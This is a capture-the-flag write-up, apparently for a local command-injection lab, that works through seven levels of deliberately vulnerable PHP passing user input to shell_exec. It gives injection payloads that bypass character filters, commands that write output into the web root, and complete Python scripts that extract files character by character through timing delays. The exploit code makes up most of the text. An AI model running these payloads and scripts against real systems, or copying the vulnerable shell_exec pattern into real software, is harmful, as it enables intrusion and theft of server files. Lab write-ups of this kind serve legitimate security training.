# TL;DR

Multiple levels forcing the use of different techniques to retrieve the flag.

# Level 1

```php
<?php
    if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
		switch($command) {
			case "ping":
				$result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
				break;
			case "nslookup":
				$result = shell_exec("timeout 10 nslookup $target 2>&1");
				break;
			case "dig":
				$result = shell_exec("timeout 10 dig $target 2>&1");
				break;
		}
		die($result);
    }
?>
```

Simple escape, nothing to explain :b

## Retrieving flag name

```
; ls /
```

## Retrieving flag

```
; cat /142awdfasd_secret.txt
```

```
CBJS{Basic_Command_Injection_0b4df8ed64f424432facd35e16883402}
```

# Level 2

```php
<?php
    if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
        if (strpos($target, ";") !== false)
            die("Hacker detected!");
		switch($command) {
			case "ping":
				$result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
				break;
			case "nslookup":
				$result = shell_exec("timeout 10 nslookup $target 2>&1");
				break;
			case "dig":
				$result = shell_exec("timeout 10 dig $target 2>&1");
				break;
		}
		die($result);
    }
?>
```

This time, `;` is blocked.
However, it can be replaced using the newline character `\n`.

## Retrieving flag name

```
\nls /
```

## Retrieving flag

```
\ncat /ash4zxdf_secret.txt
```

```
CBJS{Command_Injection_Dont_need_semicolon_763d036657127a4f21c670530e319b52}
```

# Level 3

```php
<?php
    if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
        if (strpos($target, ";") !== false)
            die("Hacker detected!");
        if (strpos($target, "&") !== false)
            die("Hacker detected!");
        if (strpos($target, "|") !== false)
            die("Hacker detected!");
		switch($command) {
			case "ping":
				$result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
				break;
			case "nslookup":
				$result = shell_exec("timeout 10 nslookup $target 2>&1");
				break;
			case "dig":
				$result = shell_exec("timeout 10 dig $target 2>&1");
				break;
		}
		die($result);
    }
?>
```

This time, the server filters out more characters (`&` and `|`), so it won't affect my previous payload.

## Retrieving flag name

```
\nls /
```

## Retrieving flag

```
\ncat /3ef1cafd_secret.txt
```

```
CBJS{Not_only_;&|_but_there_are_mor_520c298589c33766dc2688b3866c95cb}
```

# Level 4

```php
<?php
    if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
        switch($command) {
			case "backup":
				$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
                if ($result !== null && strpos($result, "zip error") === false)
                    die("Backup thành công");
                else
                    die("Backup không thành công");
				break;
            // CHANGELOG: Bảo trì
			// case "ping":
			// 	$result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
			// 	break;
			// case "nslookup":
			// 	$result = shell_exec("timeout 10 nslookup $target 2>&1");
			// 	break;
			// case "dig":
			// 	$result = shell_exec("timeout 10 dig $target 2>&1");
			// 	break;
		}
        die("Một số chức năng đang được bảo trì. Mời bạn nạp tiền để có thể tiếp tục duy trì dự án");
    }
?>
```

This time the source code has changed. I have to somehow inject a command so that `zip` won't return an error, but still executes my commands.

Additionally, the command's output won't be printed, so I need to figure out an alternative method.

My solution is to write the output to an arbitrary file and then retrieve it by sending an HTTP request.

As for the zip command, I just complete the expected syntax and then inject my payload at the end.

## Retrieving flag name

```
dsfsd -r /var/www/html/index.php 2>&1; ls />tmp.html;
```

## Retrieving flag

```
dsfsd -r /var/www/html/index.php 2>&1; cat /aefd123cdf_secret.txt>tmp.html;
```

```
CBJS{Blind_Command_Injection_a3183b33bb4885bbd0c9ddfe20c35ab8}
```

# Level 5

```php
<?php
    if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
        switch($command) {
			case "backup":
				$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
                if ($result !== null && strpos($result, "zip error") === false)
                    die("Backup thành công");
                else
                    die("Backup không thành công");
				break;
            // CHANGELOG: Bảo trì
			// case "ping":
			// 	$result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
			// 	break;
			// case "nslookup":
			// 	$result = shell_exec("timeout 10 nslookup $target 2>&1");
			// 	break;
			// case "dig":
			// 	$result = shell_exec("timeout 10 dig $target 2>&1");
			// 	break;
		}
        die("Một số chức năng đang được bảo trì. Mời bạn nạp tiền để có thể tiếp tục duy trì dự án");
    }
?>
```

The source code hasn't changed, but this time the server cannot access the internet, which means my previous method still works.

So the previous level was probably meant to be solved by exfiltrating data over the internet.

## Retrieving flag name

```
dsfsd -r /var/www/html/index.php 2>&1; ls />tmp.html;
```

## Retrieving flag

```
dsfsd -r /var/www/html/index.php 2>&1; cat /aef15696cd_secret.txt >tmp.html;
```

```
CBJS{n0_1nternet_command_injection_dbf02a0e608f8b08d5a23591a47ff36b}
```

# Level 6

```php
<?php
    if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
        switch($command) {
			case "backup":
                $result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
                if ($result !== null && strpos($result, "zip error") === false)
                    die("Backup thành công");
                else
                    die("Backup không thành công");
				break;
            // CHANGELOG: Bảo trì
			// case "ping":
			// 	$result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
			// 	break;
			// case "nslookup":
			// 	$result = shell_exec("timeout 10 nslookup $target 2>&1");
			// 	break;
			// case "dig":
			// 	$result = shell_exec("timeout 10 dig $target 2>&1");
			// 	break;
		}
        die("Một số chức năng đang được bảo trì. Mời bạn nạp tiền để có thể tiếp tục duy trì dự án");
    }
?>
```

This time, the server doesn't have permission to write to the web root directory.

The server still doesn't have access to the internet, so I guess the only way now is to extract the data by brute-forcing character by character.

I'm using this payload:

```shell
[ {ascii_here} -ge "$(printf '%d' "'$({command here} | head -c 100 | paste -sd ' ' - | cut -c {index})")" ] && sleep 0.5;
```

What I'm doing here is running the command, extracting the first 100 characters, removing every newline, selecting the exact `i-th` character, and comparing its ASCII value (for binary search).

## Retrieving flag name

```python
import requests

URL = "http://localhost:3006"
template = """
dsfsd -r /var/www/html/index.php 2>&1; [ {} -ge "$(printf '%d' "'$(ls / | head -c 100 | paste -sd ' ' - | cut -c {})")" ] && sleep 0.5;
""".strip()

res = ""

# getting flag_name

for i in range(1, 100 + 1):
    l = 33
    r = 127

    while l < r:
        mid = (l + r) >> 1
        payload = template.format(mid, i)
        data = {
            'command': 'backup',
            'target': payload
        }

        try:
            response = requests.post(URL, data=data, timeout=0.5)
        except requests.exceptions.ReadTimeout:
            r = mid
            continue

        l = mid + 1

    res += chr(l)
    print(res)

print (res)
```

> Because I'm running this lab on localhost, I set the timeout quite low (500ms). However, when doing a real challenge, this threshold should be higher to avoid false positives.

## Retrieving flag

```python
import requests

URL = "http://localhost:3006"
template = """
dsfsd -r /var/www/html/index.php 2>&1; [ {} -ge "$(printf '%d' "'$(cat /aba1238ygv_secret.txt | head -c 100 | paste -sd ' ' - | cut -c {})")" ] && sleep 0.5;
""".strip()

res = ""

# getting flag

for i in range(1, 100 + 1):
    l = 33
    r = 127

    while l < r:
        mid = (l + r) >> 1
        payload = template.format(mid, i)
        data = {
            'command': 'backup',
            'target': payload
        }

        try:
            response = requests.post(URL, data=data, timeout=0.5)
        except requests.exceptions.ReadTimeout:
            r = mid
            continue

        l = mid + 1

    res += chr(l)
    print(res)

print (res)
```

```
CBJS{trUe_0r_f4lse_d3tEct1on_b56c6ec4dd59e1741144ee8913e6b857}
```

# Level 7

```php
<?php
    if(isset($_POST['command'],$_POST['target'])){
        $command = $_POST['command'];
        $target = $_POST['target'];
        switch($command) {
			case "backup":
                # Backup to /tmp/ folder and prevent writable to document root
				$result = shell_exec("timeout 3 zip /tmp/$target -r /var/www/html/index.php 2>&1");
                die("Đã chạy câu lệnh backup");
                break;
            // CHANGELOG: Bảo trì
			// case "ping":
			// 	$result = shell_exec("timeout 10 ping -c 4 $target 2>&1");
			// 	break;
			// case "nslookup":
			// 	$result = shell_exec("timeout 10 nslookup $target 2>&1");
			// 	break;
			// case "dig":
			// 	$result = shell_exec("timeout 10 dig $target 2>&1");
			// 	break;
		}
        die("Một số chức năng đang được bảo trì. Mời bạn nạp tiền để có thể tiếp tục duy trì dự án");
    }
?>
```

I have no idea what the difference is between this and the previous level; the script still works .\_.

## Retrieving flag name

```python
import requests

URL = "http://localhost:3007"
template = """
dsfsd -r /var/www/html/index.php 2>&1; [ {} -ge "$(printf '%d' "'$(ls / | head -c 100 | paste -sd ' ' - | cut -c {})")" ] && sleep 0.5;
""".strip()

res = ""

# getting flag_name

for i in range(1, 100 + 1):
    l = 33
    r = 127

    while l < r:
        mid = (l + r) >> 1
        payload = template.format(mid, i)
        data = {
            'command': 'backup',
            'target': payload
        }

        try:
            response = requests.post(URL, data=data, timeout=0.5)
        except requests.exceptions.ReadTimeout:
            r = mid
            continue

        l = mid + 1

    res += chr(l)
    print(res)

print (res)
```

## Retrieving flag

```python
import requests

URL = "http://localhost:3007"
template = """
dsfsd -r /var/www/html/index.php 2>&1; [ {} -ge "$(printf '%d' "'$(cat /aef15696cd_secret.txt | head -c 100 | paste -sd ' ' - | cut -c {})")" ] && sleep 0.5;
""".strip()

res = ""

# getting flag

for i in range(1, 100 + 1):
    l = 33
    r = 127

    while l < r:
        mid = (l + r) >> 1
        payload = template.format(mid, i)
        data = {
            'command': 'backup',
            'target': payload
        }

        try:
            response = requests.post(URL, data=data, timeout=0.5)
        except requests.exceptions.ReadTimeout:
            r = mid
            continue

        l = mid + 1

    res += chr(l)
    print(res)

print (res)
```

```
CBJS{Dr_Str4nge_W1Ll_pR0ud_oF_y0U_5be2459fbc44d1c2331cb840acd15fd0}
```

# Level 8

The lab broke.
TODO: Fix.
